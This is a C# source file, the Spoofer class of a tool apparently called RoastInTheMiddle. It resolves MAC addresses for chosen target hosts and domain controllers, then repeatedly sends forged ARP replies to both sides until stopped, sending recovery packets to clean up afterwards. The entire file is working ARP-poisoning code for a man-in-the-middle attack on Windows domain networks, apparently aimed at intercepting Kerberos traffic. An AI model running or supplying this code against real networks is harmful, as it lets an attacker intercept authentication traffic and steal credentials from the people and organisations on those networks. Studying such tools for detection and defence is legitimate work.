using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;

namespace RoastInTheMiddle.Lib
{
    public class Spoofer
    {
        private static ILiveDevice captureDevice { get; set; }

        private static Dictionary<IPAddress, PhysicalAddress> targetAddresses { get; set; }

        private static Dictionary<IPAddress, PhysicalAddress> dcAddresses { get; set; }

        public static async Task Start(List<IPAddress> targets)
        {
            targetAddresses = new Dictionary<IPAddress, PhysicalAddress>();
            dcAddresses = new Dictionary<IPAddress, PhysicalAddress>();

            if (Program.shared["capture_device"] == null)
            {
                throw new System.Exception("Capture device not connected!");
            }

            captureDevice = (ILiveDevice)Program.shared["capture_device"];

            if (Program.shared["dcs"] == null || targets == null)
            {
                Console.WriteLine("[X] Unable to ARP spoof because either no DCs or no targets were provided");
                Program.isRunning = false;
                return;
            }

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   SPOOFER: Resolving {targets.Count} target(s) and {((List<IPAddress>)Program.shared["dcs"]).Count} DC(s)");
            }

            // resolve targets
            foreach (var target in targets)
            {
                try
                {
                    PhysicalAddress addr = GetPhysicalAddress(target);
                    if (addr == null)
                    {
                        Console.WriteLine($"[!] Unable to get hardware address for {target}, skipping.");
                    }
                    else
                    {
                        if (Program.verbose)
                        {
                            Console.WriteLine($"[*]   SPOOFER: {target} resolved to {addr}");
                        }
                        targetAddresses[target] = addr;
                        ((Dictionary<IPAddress, PhysicalAddress>)Program.shared["resolved"])[target] = addr;
                    }
                }
                catch
                {
                    Console.WriteLine($"[!] Target IP {target} not valid, skipping.");
                }
            }

            // resolve dc's
            foreach (var dc in (List<IPAddress>)Program.shared["dcs"])
            {
                try
                {
                    PhysicalAddress addr = GetPhysicalAddress(dc);
                    if (addr == null)
                    {
                        Console.WriteLine($"[!] Unable to get hardware address for {dc}, skipping.");
                    }
                    else
                    {
                        if (Program.verbose)
                        {
                            Console.WriteLine($"[*]   SPOOFER: {dc} resolved to {addr}");
                        }
                        dcAddresses[dc] = addr;
                        ((Dictionary<IPAddress, PhysicalAddress>)Program.shared["resolved"])[dc] = addr;
                    }
                }
                catch
                {
                    Console.WriteLine($"[!] DC IP {dc} not valid, skipping.");
                }
            }

            if (targetAddresses.Count == 0 || dcAddresses.Count == 0)
            {
                Console.WriteLine($"[X] Can't continue without at least 1 valid DC ({dcAddresses.Count}) and target ({targetAddresses.Count})");
                Program.isRunning = false;
                return;
            }

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   SPOOFER: Starting target and DC spoofers");
            }
            var targetSpoofer = Task.Run(() => PerformTargetSpoof());
            var dcSpoofer = Task.Run(() => PerformDCSpoof());

            var spoofers = new List<Task>();
            spoofers.Add(targetSpoofer);
            spoofers.Add(dcSpoofer);

            await Task.WhenAll(spoofers);
        }

        private static void PerformTargetSpoof()
        {
            List<Packet> arpPackets = new List<Packet>();
            List<Packet> recoveryPackets = new List<Packet>();
            foreach (var targetIP in targetAddresses.Keys)
            {
                foreach (var dcIP in dcAddresses.Keys)
                {
                    Packet arp = BuildArpResponse(targetIP, dcIP, targetAddresses[targetIP]);
                    arpPackets.Add(arp);

                    Packet arp2 = BuildArpRecovery(targetIP, dcIP, targetAddresses[targetIP], dcAddresses[dcIP]);
                    recoveryPackets.Add(arp2);
                }
            }

            while (Program.isRunning)
            {
                foreach (var arp in arpPackets)
                {
                    captureDevice.SendPacket(arp);
                }
                Thread.Sleep(100);
            }

            // send 10 recovery arp packets to clean up
            Console.WriteLine("[*]   TARGET SPOOFER: Stopping ARP pioson for targets");
            for (int i = 0; i < 10; i++)
            {
                foreach (var arp in recoveryPackets)
                {
                    captureDevice.SendPacket(arp);
                }
                Thread.Sleep(10);
            }
        }

        private static void PerformDCSpoof()
        {
            List<Packet> arpPackets = new List<Packet>();
            List<Packet> recoveryPackets = new List<Packet>();
            foreach (var dcIP in dcAddresses.Keys)
            {
                foreach (var targetIP in targetAddresses.Keys)
                {
                    Packet arp = BuildArpResponse(dcIP, targetIP, dcAddresses[dcIP]);
                    arpPackets.Add(arp);

                    Packet arp2 = BuildArpRecovery(dcIP, targetIP, dcAddresses[dcIP], targetAddresses[targetIP]);
                    recoveryPackets.Add(arp2);
                }
            }

            while (Program.isRunning)
            {
                foreach (var arp in arpPackets)
                {
                    captureDevice.SendPacket(arp);
                }
                Thread.Sleep(100);
            }

            // send 10 recovery arp packets to clean up
            Console.WriteLine("[*]   DC SPOOFER: Stopping ARP pioson for DCs");
            for (int i = 0; i < 10; i++)
            {
                foreach (var arp in recoveryPackets)
                {
                    captureDevice.SendPacket(arp);
                }
                Thread.Sleep(10);
            }
        }

        private static PhysicalAddress GetPhysicalAddress(IPAddress ipAddress)
        {
            PhysicalAddress physicalAddress = null;

            try
            {
                byte[] ab = new byte[6];
                int len = ab.Length, r = Interop.SendARP((int)ipAddress.Address, 0, ab, ref len);
                string hwAddress = BitConverter.ToString(ab, 0, 6);
                if (hwAddress != "00-00-00-00-00-00")
                    physicalAddress = PhysicalAddress.Parse(hwAddress);
            }
            catch (Exception) { }

            return physicalAddress;
        }

        private static Packet BuildArpResponse(IPAddress destIP, IPAddress sourceIP, PhysicalAddress destHwAddr)
        {
            EthernetPacket arp = new EthernetPacket(captureDevice.MacAddress, destHwAddr, EthernetType.Arp);
            ArpPacket arpframe = new ArpPacket(ArpOperation.Response, destHwAddr, destIP, captureDevice.MacAddress, sourceIP);
            arp.PayloadPacket = arpframe;
            return arp;
        }

        private static Packet BuildArpRecovery(IPAddress destIP, IPAddress sourceIP, PhysicalAddress destHwAddr, PhysicalAddress sourceHwAddr)
        {
            EthernetPacket arp = new EthernetPacket(sourceHwAddr, destHwAddr, EthernetType.Arp);
            ArpPacket arpframe = new ArpPacket(ArpOperation.Response, destHwAddr, destIP, sourceHwAddr, sourceIP);
            arp.PayloadPacket = arpframe;
            return arp;
        }
    }
}
